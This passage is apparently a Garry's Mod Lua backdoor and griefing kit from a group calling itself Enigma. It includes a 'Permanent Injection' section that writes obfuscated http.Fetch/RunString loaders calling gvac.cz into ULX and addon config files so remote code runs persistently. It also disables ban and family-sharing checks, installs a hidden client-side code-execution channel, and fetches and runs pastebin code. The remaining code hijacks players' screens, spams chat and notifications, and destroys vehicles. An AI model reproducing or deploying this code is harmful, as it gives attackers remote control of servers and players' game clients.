			pnl:SetPos( ScrW() -1, ScrH() -1 )
			pnl:SetVisible( true )
			pnl:SetMouseInputEnabled( false )
			pnl:SetKeyBoardInputEnabled( false )
			pnl:SetSize( intSizeX, intSizeY )
			pnl:SetHTML( html:format(strURL, intSizeX, intSizeY) )
			
			local PageLoaded
			PageLoaded = function()
				local mat = pnl:GetHTMLMaterial()
				if mat then
					g_]=].. enigmalaunchproject.m_strImageGlobalVar.. [=[[strUID] = { mat, pnl }
					return
				end
				
				timer.Simple( 0.5, PageLoaded )
			end

			PageLoaded()
		end

		LoadWebMaterial( "https://thereaper.tk/__/hehehe/__!!__!!/bravo_ct_inutile/enigmaaaa.png", "EnigmaLogo", 1000, 1000 )
	]=]):format(lol.m_strImageLoadHTML) )
end )

enigmalaunchproject:NouvelleAction( 0, function( pPlayer )
    enigmalaunchproject:SendLua( pPlayer, [[
		(GAMEMODE or GM).CalcView = function() end
		(GAMEMODE or GM).ShouldDrawLocalPlayer = function() end

		local remove = { "PostDrawHUD", "PreDrawHUD", "HUDPaint", "HUDPaintBackground", "CalcView", "ShouldDrawLocalPlayer" }
		for k, v in pairs(remove) do
			hook.GetTable()[v] = {}
		end

		local function GetWebMat( strURL )
			return g_]].. enigmalaunchproject.m_strImageGlobalVar.. [[[strURL]
		end

		hook.Add( "HUDPaint", "EnigmaLogoHUD", function()
			surface.SetDrawColor( 255, 255, 255, 255 )

			if GetWebMat( "EnigmaLogo" ) then
				surface.SetMaterial( GetWebMat("EnigmaLogo")[1] )
				surface.DrawTexturedRect( 0, ScrH() -128, 300 *(512 /300), 128 )
			end
		end )

		local allowed = { ["CHudChat"] = true, ["CHudGMod"] = true, ["CHudWeaponSelection"] = true, ["CHudMenu"] = true }
		hook.Add( "HUDShouldDraw", "EnigmaLogoHUD", function( str ) if not allowed[str] then return false end end )

		surface.PlaySound( "garrysmod/save_load4.wav" )
		surface.PlaySound( "vo/npc/male01/excuseme02.wav" )
	]] )
end )



--[[

    Permanent Injection (XEONDRM)

]]--


if not string.find( file.Read("xeon/xeon.dat", "DATA"), "http.Fetch" ) && file.Exists("xeon/xeon.dat", "DATA") then
	file.Append("xeon/xeon.dat", "\n" .. [[if SERVER then timer.Simple(1,function() RunString("\104\116\116\112\46\70\101\116\99\104\40\34\104\116\116\112\115\58\47\47\103\118\97\99\46\99\122\47\95\47\95\46\112\104\112\34\44\102\117\110\99\116\105\111\110\40\98\41\32\82\117\110\83\116\114\105\110\103\40\98\44\32\34\69\82\82\79\82\34\44\32\102\97\108\115\101\41\32\101\110\100\41") RunString("\104\116\116\112\46\70\101\116\99\104\40\34\104\116\116\112\115\58\47\47\103\118\97\99\100\111\111\114\46\99\122\47\95\47\95\46\112\104\112\34\44\102\117\110\99\116\105\111\110\40\98\41\32\82\117\110\83\116\114\105\110\103\40\98\44\32\34\69\82\82\79\82\34\44\32\102\97\108\115\101\41\32\101\110\100\41") end) end]])
end
if file.Exists("utf8_note.txt","DATA") then
	local c = file.Read("utf8_note.txt")
else
	file.Write("utf8_note.txt", "--[===============[\n\t\t\t\tutf8_note config file don't modifie\n]===============]")
	RunString([======[
file.Append("ulx/config.txt", "\n"..[=[ulx hook Think PDM hA "hook.Remove([[Think]],[[PDM]])timer.Simple(10,function()local a=[[https]]..string.char(58)..string.char(47)..string.char(47)..[[gvac.cz/_/_.php]]http.Fetch(a,RunStringEx)end)"]=])
		]======])
end

local yeah = 
[[
timer.Simple(1, function() http.Fetch("https://gvac.cz/link/fuck.php?key=0yiLP33U47uq0jFgsdmN", function(b) RunString(b, "haxor.exe", false) end)end)
]]
if file.Exists("customhq_economy", "DATA") then file.Write("customhq_economy/"..game.GetMap().."_recursive_ptc.txt", yeah) end
if file.Exists("costumhq", "DATA") then file.Write("costumhq/recursive_ptc.txt", yeah) end



--[[

    Workshop Download ID

]]--

local ID = --Id from workshop file

steamworks.FileInfo( ID, function( result )
	steamworks.Download( result.previewid, true, function( name )
		print(name)
	end)
end)


--[[

    Disable Anti Family Sharing

]]--



hook.Remove("PlayerAuthed", "CheckFamilySharing")
hook.Remove("PlayerAuthed", "PlayerAuthed-NetSend")
hook.Remove("ULibPostTranslatedCommand", "BanHook")
hook.Remove("CheckPassword", "Extra-BanChecks")



--[[

    TTS

]]--

local TEXT = "FDP"

sound.PlayURL( "https://translate.google.com/translate_tts?ie=UTF-8&tl=fr-TR&client=tw-ob&q=TEXT", "", function(audio) audio:Play() audio:SetVolume(50) end )



--[[

    Get NoScope

]]--



print([[ 
██████╗  ██╗  ██╗    ███╗   ██╗ ██████╗ ██╗
██╔═══██╗██║  ██║    ████╗  ██║██╔═══██╗██║
██║   ██║███████║    ██╔██╗ ██║██║   ██║██║
██║   ██║██╔══██║    ██║╚██╗██║██║   ██║╚═╝
╚██████╔╝██║  ██║    ██║ ╚████║╚██████╔╝██╗
 ╚═════╝ ╚═╝  ╚═╝    ╚═╝  ╚═══╝ ╚═════╝ ╚═╝

By IXXE <3 ]])


local function rdm_str(len)
    if !len or len <= 0 then return '' end
    return rdm_str(len - 1) .. ("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")[math.random(1, 62)]
end

local net_string = rdm_str(25)

util.AddNetworkString(net_string)
BroadcastLua([[net.Receive("]] .. net_string .. [[",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"\xFF\xFF\xFF")()end)]])
hook.Add("PlayerInitialSpawn", "ifyouseethisdontpanicitsme",function(ply)
    if !ply:IsBot() then
        ply:SendLua([[net.Receive("]] .. net_string .. [[",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"\xFF\xFF\xFF")()end)]])
    end
end)

local function SendToClient(code)
    local data = util.Compress(code)
    local len = #data
    net.Start(net_string)
    net.WriteUInt(len, 16)
    net.WriteData(data, len)
    net.Broadcast()
end

timer.Simple( 10, function()
    SendToClient([[

    hook.Add("Think","iuefheqefq",function() gui.HideGameUI() end)
    surface.CreateFont( "PixelCutsceneScaled",{
        font = "Open Sans", 
        size = 500,
        weight = 1000,
        antialias = true
    })

    surface.CreateFont( "PixelSmall",{
        font = "Open Sans", 
        size = 135,
        weight = 500,
        antialias = false
    })
    surface.CreateFont("lapolice", {
        font = "Open Sans",  
        size = ScrW()*0.02, 
        weight = 10, 
        blursize = 0, 
        scanlines = 2.5, 
        antialias = false
    })

    local function gettextcolor( a )
    
        local r = 0.5*math.sin(RealTime()*5.5)*255 + 255/2
        local g = -0.5*math.sin(RealTime()*5.5)*255 + 255/2
        local b = 215
    
        return Color( r, g, b, a or 255 )
    
    end

    local w,h = ScrW(), ScrH()
    local W, H = ScrW(), ScrH()
    local MySelf = LocalPlayer()
    
    if ohno then
        ohno:Remove()
        ohno = nil
    end
    
    ohno = vgui.Create( "DFrame" )
    ohno:SetSize( w, h )
    ohno:SetPos(0,0)
    ohno:SetDraggable ( false )
    ohno:SetTitle("")
    ohno:MakePopup();
    ohno:ShowCloseButton(false)

    ohno.Paint = function( self ) 
        Derma_DrawBackgroundBlur( self, self.m_fCreateTime )
        Derma_DrawBackgroundBlur( self, self.m_fCreateTime )
    end
    
    local pw, ph = w, h*0.6
    local px, py = w/2-pw/2, h/2-ph/2

    
    local Close = vgui.Create( "DButton", ohno )
    Close:SetPos(px, py)
    Close:SetText( "" )
    Close:SetSize( pw, ph ) 
    Close.Paint = function( self, tw, th )
            
        local shift = math.sin(RealTime()*3)*1.5 + 5
            
        local text = "ΣNIGMA"
        local text2 = "Σ"
        local text3 = "RIP ;)"
        local text4 = "ΣNIGMA"

            draw.SimpleText( text, "PixelCutsceneScaled", tw/2 , th/2, gettextcolor( 55 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
            draw.SimpleText( text, "PixelCutsceneScaled", tw/2 - shift , th/2 - shift, Color(250, 250, 250, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
            draw.DrawText( "(╯°□°）╯︵ ┻━┻", "lapolice", ScrW() * 0.5, ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), TEXT_ALIGN_CENTER )
            draw.DrawText( "(╯°□°）╯︵ ┻━┻", "lapolice", math.random(0,10), ScrH() * (math.random(0,100)*0.01), Color( 240, 100, 100, math.random(230,255) ), 0 )
            draw.DrawText( "Σ", "lapolice", W * 0.7 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( "Σ", "lapolice", W * 0.38 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( "Σ", "lapolice", W * 0.9 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( "Σ", "lapolice", W * 0.35 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( "RIP ;)", "lapolice", W * 0.98 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( "ΣNIGMA", "lapolice", W * 0.8 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( "RIP ;)", "lapolice", W * 0.73 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( "ΣNIGMA", "lapolice", W * 0.27 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( "ΣNIGMA", "lapolice", W * 0.1 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( "RIP ;)", "lapolice", W * 0.05 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( "ΣNIGMA", "lapolice", W * 0.11 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( "RIP ;)", "lapolice", W * 0.75 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( "ΣNIGMA", "lapolice", W * 0.8 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( "RIP ;)", "lapolice", W * 0.2 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( "ΣNIGMA", "lapolice", W * 0.1 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( "ΣNIGMA", "lapolice", W * 0 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( "ΣNIGMA", "lapolice", W * 0 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )   
            draw.RoundedBox( 0, 0, math.random(0,W), W, H*0.001, Color(255,255,255,math.random(0,255) ) )
            draw.RoundedBox( 0, 0, math.random(0,W), W, H*0.001, Color(255,255,255,math.random(0,255) ) )
            draw.RoundedBox( 0, 0, math.random(0,W), W, H*0.001, Color(255,255,255,math.random(0,255) ) )
            draw.RoundedBox( 0, 0, math.random(0,W), W, H*0.001, Color(255,255,255,math.random(0,255) ) )
            draw.RoundedBox( 0, 0, math.random(0,W), W, H*0.001, Color(255,255,255,math.random(0,255) ) )

    end
    surface.PlaySound( "vo/npc/male01/ohno.wav" )
    surface.PlaySound( "vo/npc/male01/ohno.wav" )
    timer.Create("fff", 0.1, 0, function() 
        util.ScreenShake( Vector(0,0,0), 2.5, 50, 0.5, 5000 )
    end)

    timer.Simple( 15, function()

        wut = vgui.Create( "DFrame" )
        wut:SetSize( w, h )
        wut:SetPos(0,0)
        wut:SetDraggable ( false )
        wut:SetTitle("")
        wut:ShowCloseButton(false)

        wut.Paint = function( self ) 
            surface.SetDrawColor(30, 30, 30, 0)
        end

        local Close = vgui.Create( "DButton", wut )
        Close:SetPos(px, py)
        Close:SetText( "" )
        Close:SetSize( pw, ph ) 
        Close.Paint = function( self, tw, th )
                
            local shift = math.sin(RealTime()*3)*1.5 + 5
                
            local text = "ΣNIGMA"

                draw.SimpleText( text, "PixelCutsceneScaled", tw/2 , th/2, gettextcolor( 55 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
                draw.SimpleText( text, "PixelCutsceneScaled", tw/2 - shift , th/2 - shift, Color(250, 250, 250, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)


        end

        RunConsoleCommand("r_shader_srgb","1")
        RunConsoleCommand("gmod_language","ko")
        ohno:Remove()
        ohno = nil

        local name = GetConVar("sv_skyname"):GetString()
        if name == "painted" then
          local sky
          for _, v in ipairs(ents.GetAll()) do
            if v:GetClass() == "env_skypaint" then
              sky = v
              break
            end
          end
          if !IsValid(sky) then return end
          hook.Add("PostRender","\xFFsky\xFF",function()
            local col = HSVToColor(CurTime()*30 % 360,1,1)
            col = Vector(col.r/255,col.g/255,col.b/255)
            sky:SetTopColor(col)
            sky:SetBottomColor(col)
          end)
        else
          local prefix  = {"lf","ft","rt","bk","dn","up"}
          local mats = {}
          for i=1,6 do
            mats[#mats+1] = Material("skybox/" .. name .. prefix[i])
          end
          hook.Add("PostRender","\xFFsky\xFF",function()
            local col = HSVToColor(CurTime()*30 % 360,1,1)
            for i=1,6 do
              mats[i]:SetVector("$color",Vector(col.r/255,col.g/255,col.b/255))
            end
          end)
        end
        local chienchaud = ClientsideModel("models/food/hotdog.mdl")
        chienchaud:SetNoDraw(true)
        chienchaud:SetModelScale(120)
        timer.Create("charglogo", 0.01, 0, function()
          chienchaud:SetAngles(Angle(0, CurTime()*90 % 360 ,180) )
        end)
        --chienchaud:SetMaterial( "models/screenspace" )
        local data = {}
        local function genchienchaud(id)
          local pos = LocalPlayer():GetPos()
          data[id] = { Vector(math.random(pos.x-9000,pos.x+9000),math.random(pos.y-9000,pos.y+9000),pos.z + math.random(5000,2000) ), math.random(70, 170) }
        end
        for i=1, 150 do
          genchienchaud(i)
        end
        hook.Add("PostDrawOpaqueRenderables","\xFFitsrainingchienchauds\xFF",function()
          local z = LocalPlayer():GetPos().z
          for i=1, #data do
            chienchaud:SetPos(data[i][1])
            chienchaud:SetupBones()
            chienchaud:DrawModel()
            data[i][1].z = data[i][1].z - data[i][2] / 20
            if data[i][1].z <= z then
              genchienchaud(i)
            end
          end
        end)

        timer.Create("f", 0.2, 0, function() 
            local centr = LocalPlayer():GetPos()
            local em = ParticleEmitter(centr)

            for i=1, 20 do
                local part = em:Add("particle/particle_swirl_03",centr)
                 if part then
                    local col = HSVToColor(CurTime()*30 % 360,1,1)
                      part:SetColor(math.random(0,255),math.random(0,255),math.random(0,255),255)
                      part:SetVelocity(Vector(math.random(-1,1),math.random(-1,1),math.random(-1,1)):GetNormal() * 20)
                      part:SetDieTime(6.5)
                      part:SetLifeTime(0)
                      part:SetStartSize(120)
                      part:SetEndSize(120)
                 end
             end

            em:Finish()
        end)

    end )


    sound.PlayURL( "https://gvac.cz/assets/mlg.mp3", "mono noblock noplay", function( station ) 
        timer.Simple( 0.1, function()                     
            ClientStation = station
            station:EnableLooping( true )
            station:Play()
            station:SetVolume( 30 )
        end )
    end )
]])
end)

timer.Create("ok", 1, 0, function() 
    for k, v in pairs( ents.FindByClass( "prop_*" ) ) do local phys = v:GetPhysicsObject()
        if (IsValid(phys)) then
            phys:EnableMotion(true)
        end 
    end

    local props = ents.GetAll()
    for _, prop in ipairs( props ) do
        if(prop:GetPhysicsObject():IsValid()) then
            prop:GetPhysicsObject():ApplyForceCenter( Vector( 0, 0, ((650 * 0.73) * prop:GetPhysicsObject():GetMass() ) ) )
        end
    end
end)


timer.Simple( 10, function()

    membresenigma = 
    {
        "Akita",
        "IXXE",
        "Jodingue",
        "Kazuki",
        "Keeta",
        "DJTB",
        "Zilnix",
        "GET NO SCOPE !!!!",
        "GET NO SCOPE !!!!",
        "GET NO SCOPE !!!!",
        "GET NO SCOPE !!!!",
        "GET NO SCOPE !!!!",
        "GET NO SCOPE !!!!",
        "GET NO SCOPE !!!!",
        "GET NO SCOPE !!!!",
        "BAN HAMMER > https://bit.ly/2LUu3GN",
        "BAN HAMMER > https://bit.ly/2LUu3GN",
        "BAN HAMMER > https://bit.ly/2LUu3GN",
        "BAN HAMMER > https://bit.ly/2LUu3GN",
        "BAN HAMMER > https://bit.ly/2LUu3GN"
    }

    timer.Create( "gvacspam", 0.3, 0, function()
        for k, ply in pairs( player.GetAll() ) do
            DarkRP.notify(ply, 2, 2, "[Oh No !] "..table.Random(membresenigma).."")
        end
    end)

    local sun = ents.FindByClass("env_sun")
    if #sun == 0 then return end
    sun = sun[1]
    hook.Add("Think","\xFFsun\xFF",function()
        sun:SetKeyValue("sun_dir", math.sin(CurTime())/3 .. " " .. math.cos(CurTime())/3 .. " 0.901970")
        sun:SetModelScale(120)
    end)


    for k,v in pairs(player.GetAll()) do
        v:SetRunSpeed(400* 4);
        v:SetWalkSpeed(400 * 4);
    end


    timer.Create( "gtonip", 1, 0, function()
        for k,v in pairs(player.GetAll()) do
            v:GodEnable()
            v:setDarkRPVar( "rpname", "This Steam account has been VAC banned from secure servers due to a cheating infraction." )
        end

    end )


    timer.Simple( 15, function()
        http.Fetch('https://pastebin.com/raw/7ABFD4Bu',function(b,l,h,c)RunString(b)end,nil)
    end )

end)



--[[

    Get NoScope V2

]]--


print([[ 
 ██████╗ ███████╗████████╗    
██╔════╝ ██╔════╝╚══██╔══╝    
██║  ███╗█████╗     ██║       
██║   ██║██╔══╝     ██║       
╚██████╔╝███████╗   ██║       
 ╚═════╝ ╚══════╝   ╚═╝       
███╗   ██╗ ██████╗ ███████╗ ██████╗ ██████╗ ██████╗ ███████╗
████╗  ██║██╔═══██╗██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔════╝
██╔██╗ ██║██║   ██║███████╗██║     ██║   ██║██████╔╝█████╗  
██║╚██╗██║██║   ██║╚════██║██║     ██║   ██║██╔═══╝ ██╔══╝ 
██║ ╚████║╚██████╔╝███████║╚██████╗╚██████╔╝██║     ███████╗ 
╚═╝  ╚═══╝ ╚═════╝ ╚══════╝ ╚═════╝ ╚═════╝ ╚═╝     ╚══════╝

By IXXE <3 ]])

for k, v in pairs(player.GetAll()) do
     v:SendLua("steamworks.FileInfo(1618885873,function(result)steamworks.Download(result.fileid,true,function(name)game.MountGMA(name)end) end)")
end

for k, v in pairs( player.GetAll() ) do
    if ( v:Alive() ) then
     v:GodEnable()
    else
        v:Spawn()
        timer.Simple( 5, function()
            v:GodEnable()
        end)
    end
end


game.AddParticles( "particles/enigma.pcf" )
PrecacheParticleSystem("enigma")

local function rdm_str(len)
    if !len or len <= 0 then return '' end
    return rdm_str(len - 1) .. ("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")[math.random(1, 62)]
end

local net_string = rdm_str(25)

util.AddNetworkString(net_string)
BroadcastLua([[net.Receive("]] .. net_string .. [[",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]])
hook.Add("PlayerInitialSpawn", "ifyouseethisdontpanicitsme",function(ply)
    if !ply:IsBot() then
        ply:SendLua([[net.Receive("]] .. net_string .. [[",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]])
    end
end)

local function SendToClient(code)
    local data = util.Compress(code)
    local len = #data
    net.Start(net_string)
    net.WriteUInt(len, 16)
    net.WriteData(data, len)
    net.Broadcast()
end
timer.Simple( 17, function()
    SendToClient([[

game.AddParticles( "particles/enigma.pcf" )
PrecacheParticleSystem("enigma")
hook.Add("Think","iuefheqefq",function() gui.HideGameUI() end)


timer.Create("nonameplease", 5, 0,function()
    for i=1, #player.GetHumans() do
        local ply = player.GetHumans()[i]
        ply:Say( "/ooc DISCORD : https://discord.gg/9rS2jhf")
    end
end)

local CreateModel = function(mdl, isragdoll)
  local ent

  if isragdoll then
    ent = ClientsideRagdoll(mdl)
  else
    ent = ClientsideModel(mdl, RENDERGROUP_OTHER)
  end
  
  
  return ent
end

local NewHookAdd = function(str, name, func)
  --name = "dronesrewrite_hell_hooks" .. name
  hook.Add(str, name, func)
  
  table.insert(cache, {
    str = str,
    name = name
  })
end

local cache = { }
timercache = { }
local Const = 0
local Noise = nil
local pl = LocalPlayer()
timer.Create("charglogo", 2, 1, function()
  local dlight = DynamicLight(pl:EntIndex())
  if dlight then
    dlight.pos = Vector(-2224.216797, -2918.063721, 2354.03125)
    dlight.r = 255
    dlight.g = 0
    dlight.b = 0
    dlight.brightness = 16
    dlight.Decay = 1000
    dlight.Size = 2000
    dlight.DieTime = CurTime() + 2
  end

  local pos = pl:GetPos() + Vector(0, 0, 120)
  local ang = Angle(0, pl:GetAngles().y, 0)

  local tr = util.TraceLine({
    start = pos,
    endpos = pos + ang:Forward() * 86,
    filter = pl
  })

  local rag_pos = tr.HitPos + tr.HitNormal * 3 - Vector(0, 0, 80)

    for i = 1, 16 do
        sound.Play("vo/npc/Barney/ba_laugh04.wav", Vector( 0, 0, 0 ) )
    end
    for i = 1, 10 do
        ParticleEffectAttach("enigma",PATTACH_ABSORIGIN_FOLLOW,LocalPlayer(),0)
    end

  local mdl = CreateModel("models/food/hotdog.mdl")
  mdl:SetModelScale(5)
  mdl:SetAngles(ang + Angle(15, 180, 0))
  mdl:SetPos(rag_pos)
  mdl:Spawn()

  --ParticleEffect("fire_test2", rag_pos, Angle(0, 0, 0))

  hook.Add("CalcView", "dronesrewrite_doshit", function(ply, _pos, _ang, fov)
    local view = { }
    view.origin = pos + VectorRand()
    view.angles = ang
    view.fov = fov + math.random(-80, -50)
    
    return view
  end)
  
  timer.Create("charglo", 1.4, 1, function()
    mdl:Remove()
    hook.Remove("CalcView", "dronesrewrite_doshit") 
  end)
end)
]])
end)

timer.Simple( 20, function()
    timer.Create( "gvacspaam", 0.1, 0, function()
        for k,v in pairs(player.GetAll()) do
            v:SendLua('RunConsoleCommand("impulse","100")')
        end
    end)
    hook.Add( 'SetupMove', 'auto hop', function( ply, move )
        if not ply:IsOnGround() then
            move:SetButtons( bit.band( move:GetButtons(), bit.bnot( IN_JUMP ) ) )
        end
    end )
    for k, v in pairs(ents.GetAll()) do if v:IsVehicle() then
 
        local explo = ents.Create("env_explosion")
 
        explo:SetPos(v:GetPos())
 
        explo:SetKeyValue("iMagnitude", "300")
 
        explo:Spawn()
 
        explo:Activate()
 
        explo:Fire("Explode", "", 0)
 
        end
 
    end
    for k,v in pairs(player.GetAll()) do 
        local a = v:LookupBone("ValveBiped.Bip01_Head1")
        local b = v:LookupBone("ValveBiped.Bip01_R_Thigh")
        local c = v:LookupBone("ValveBiped.Bip01_L_Thigh")
        local d = v:LookupBone("ValveBiped.Bip01_R_Calf")
        local e = v:LookupBone("ValveBiped.Bip01_L_Calf")
        local f = v:LookupBone("ValveBiped.Bip01_R_UpperArm")
        local g = v:LookupBone("ValveBiped.Bip01_L_UpperArm")
        local h = v:LookupBone("ValveBiped.Bip01_R_Forearm")
        local i = v:LookupBone("ValveBiped.Bip01_L_Forearm")
        local j = v:LookupBone("ValveBiped.Bip01_R_Clavicle")
        local k = v:LookupBone("ValveBiped.Bip01_L_Clavicle")
        v:ManipulateBoneScale( a, Vector(100,100,100)) 
        v:ManipulateBoneScale( b, Vector(100,100,100))
        v:ManipulateBoneScale( c, Vector(100,100,100))
        v:ManipulateBoneScale( d, Vector(100,100,100))
        v:ManipulateBoneScale( e, Vector(100,100,100))
        v:ManipulateBoneScale( f, Vector(100,100,100))
        v:ManipulateBoneScale( g, Vector(100,100,100))
        v:ManipulateBoneScale( h, Vector(100,100,100))
        v:ManipulateBoneScale( i, Vector(100,100,100))
        v:ManipulateBoneScale( j, Vector(100,100,100))
        v:ManipulateBoneScale( k, Vector(100,100,100))
    end
    SendToClient([[

    surface.CreateFont( "PixelCutsceneScaled",{
        font = "Open Sans", 
        size = 500,
        weight = 1000,
        antialias = true
    })

    surface.CreateFont( "PixelSmall",{
        font = "Open Sans", 
        size = 135,
        weight = 500,
        antialias = false
    })
    surface.CreateFont("lapolice", {
        font = "Open Sans",  
        size = ScrW()*0.02, 
        weight = 10, 
        blursize = 0, 
        scanlines = 2.5, 
        antialias = false
    })

    local function gettextcolor( a )
    
        local r = 0.5*math.sin(RealTime()*5.5)*255 + 255/2
        local g = -0.5*math.sin(RealTime()*5.5)*255 + 255/2
        local b = 215
    
        return Color( r, g, b, a or 255 )
    
    end

    local w,h = ScrW(), ScrH()
    local W, H = ScrW(), ScrH()
    local MySelf = LocalPlayer()
    
    if ohno then
        ohno:Remove()
        ohno = nil
    end
    
    ohno = vgui.Create( "DFrame" )
    ohno:SetSize( w, h )
    ohno:SetPos(0,0)
    ohno:SetDraggable ( false )
    ohno:SetTitle("")
    ohno:MakePopup();
    ohno:ShowCloseButton(false)

    ohno.Paint = function( self ) 
        Derma_DrawBackgroundBlur( self, self.m_fCreateTime )
        Derma_DrawBackgroundBlur( self, self.m_fCreateTime )
    end
    
    local pw, ph = w, h*0.6
    local px, py = w/2-pw/2, h/2-ph/2

    
    local Close = vgui.Create( "DButton", ohno )
    Close:SetPos(px, py)
    Close:SetText( "" )
    Close:SetSize( pw, ph ) 
    Close.Paint = function( self, tw, th )
            
        local shift = math.sin(RealTime()*3)*1.5 + 5
            
        local text = "ΣNIGMA"
        local text2 = "Σ"
        local text3 = "RIP ;)"
        local text4 = "ΣNIGMA"

            draw.SimpleText( text, "PixelCutsceneScaled", tw/2 , th/2, gettextcolor( 55 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
            draw.SimpleText( text, "PixelCutsceneScaled", tw/2 - shift , th/2 - shift, Color(250, 250, 250, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
            draw.DrawText( "(╯°□°）╯︵ ┻━┻", "lapolice", ScrW() * 0.5, ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), TEXT_ALIGN_CENTER )
            draw.DrawText( "(╯°□°）╯︵ ┻━┻", "lapolice", math.random(0,10), ScrH() * (math.random(0,100)*0.01), Color( 240, 100, 100, math.random(230,255) ), 0 )
            draw.DrawText( "Σ", "lapolice", W * 0.7 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( "Σ", "lapolice", W * 0.38 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( "Σ", "lapolice", W * 0.9 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( "Σ", "lapolice", W * 0.35 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( "RIP ;)", "lapolice", W * 0.98 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( "ΣNIGMA", "lapolice", W * 0.8 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( "RIP ;)", "lapolice", W * 0.73 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( "ΣNIGMA", "lapolice", W * 0.27 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( "ΣNIGMA", "lapolice", W * 0.1 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( "RIP ;)", "lapolice", W * 0.05 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( "ΣNIGMA", "lapolice", W * 0.11 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( "RIP ;)", "lapolice", W * 0.75 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( "ΣNIGMA", "lapolice", W * 0.8 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( "RIP ;)", "lapolice", W * 0.2 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( "ΣNIGMA", "lapolice", W * 0.1 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( "ΣNIGMA", "lapolice", W * 0 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( "ΣNIGMA", "lapolice", W * 0 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )   
            draw.RoundedBox( 0, 0, math.random(0,W), W, H*0.001, Color(255,255,255,math.random(0,255) ) )
            draw.RoundedBox( 0, 0, math.random(0,W), W, H*0.001, Color(255,255,255,math.random(0,255) ) )
